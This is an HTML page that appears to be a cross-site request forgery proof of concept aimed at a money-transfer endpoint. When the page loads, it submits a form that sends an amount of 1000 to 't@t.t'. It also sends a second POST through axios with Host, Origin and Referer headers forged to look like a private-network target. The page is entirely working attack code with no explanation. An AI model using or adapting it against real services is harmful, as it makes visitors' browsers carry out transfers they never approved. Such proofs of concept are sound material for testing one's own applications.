<html lang="">
<head>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <title></title>
</head>
<body>
<form action="/transfer" id="transfer" method="POST" name="transfer">
    <div class="form-row">
        <div class="form-group col-md-6">
            <label for="inputTo">To</label>
            <input class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?"
                   type="text" value="t@t.t">
        </div>
        <div class="form-group col-md-6">
            <label for="inputAmount">Amount</label>
            <input class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" type="number"
                   value="1000">
        </div>
    </div>
    <input type="submit" value="submit" name="transfer_submit">
</form>
<script>
    window.onload = function () {
        document.forms["transfer"].submit();
        const formData = new FormData();
        formData.append("user_to", "t@t.t")
        formData.append("amount", "1000")
        axios.post('/transfer', formData, {
            headers: {
                "Host": "192.168.2.98:49698",
                "Origin": "http://192.168.2.98:49698",
                "Referer": "http://192.168.2.98:49698/viewtransfer",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        });
    }
</script>
</body>
</html>
